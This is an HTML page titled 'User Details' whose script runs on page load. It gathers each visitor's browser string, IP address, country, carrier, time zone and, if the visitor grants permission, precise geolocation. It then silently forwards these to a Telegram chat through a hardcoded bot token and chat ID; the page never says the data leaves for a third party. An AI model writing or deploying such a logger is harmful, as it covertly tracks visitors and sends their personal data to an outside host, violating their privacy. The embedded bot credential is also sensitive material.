<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Details</title>
    <script>
        async function getUserDetails() {
            // Get browser details
            const browserName = navigator.userAgent;

            // Get user's local time
            const userLocalTime = new Date().toLocaleString();

            // Get server time
            const serverTime = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

            // Fetch user's IP details for country, IP, and carrier information
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            const userCountry = data.country_name;
            const userTimeZone = data.timezone;
            const userIP = data.ip;
            const userCarrier = data.org;

            // Get user's location (requires user permission)
            let latitude = '';
            let longitude = '';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    latitude = position.coords.latitude;
                    longitude = position.coords.longitude;
                    document.getElementById('location').innerText = `Location: Latitude ${latitude}, Longitude ${longitude}`;
                }, error => {
                    console.error('Error getting location:', error);
                    document.getElementById('location').innerText = 'Location: Permission denied';
                });
            } else {
                document.getElementById('location').innerText = 'Location: Not supported';
            }

            // Display the details
            document.getElementById('browser').innerText = `Browser: ${browserName}`;
            document.getElementById('country').innerText = `Country: ${userCountry}`;
            document.getElementById('user-time').innerText = `User Local Time: ${userLocalTime}`;
            document.getElementById('server-time').innerText = `Server Time (UTC): ${serverTime}`;
            document.getElementById('timezone').innerText = `User Time Zone: ${userTimeZone}`;
            document.getElementById('ip').innerText = `IP Address: ${userIP}`;
            document.getElementById('carrier').innerText = `Carrier: ${userCarrier}`;

            // Send details to Telegram
            sendDetailsToTelegram(browserName, userCountry, userLocalTime, serverTime, userTimeZone, userIP, userCarrier, latitude, longitude);
        }

        async function sendDetailsToTelegram(browser, country, userTime, serverTime, timeZone, ip, carrier, latitude, longitude) {
            const token = '6995788930:AAHvBgC0Qg606fA7B5U13eT5T-qfcwj3n0k';
            const chatId = '-1002210914711';
            const message = `
                Browser: ${browser}\n
                Country: ${country}\n
                User Local Time: ${userTime}\n
                Server Time (UTC): ${serverTime}\n
                User Time Zone: ${timeZone}\n
                IP Address: ${ip}\n
                Carrier: ${carrier}\n
                Location: Latitude ${latitude}, Longitude ${longitude}
            `;

            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

            try {
                await fetch(url);
                console.log('Details sent to Telegram successfully.');
            } catch (error) {
                console.error('Error sending details to Telegram:', error);
            }
        }

        window.onload = getUserDetails;
    </script>
</head>
<body>
    <h1>User Details</h1>
    <p id="browser">Loading browser details...</p>
    <p id="country">Loading country details...</p>
    <p id="user-time">Loading user local time...</p>
    <p id="server-time">Loading server time...</p>
    <p id="timezone">Loading user time zone...</p>
    <p id="ip">Loading IP address...</p>
    <p id="carrier">Loading carrier...</p>
    <p id="location">Loading location...</p>
</body>
</html>
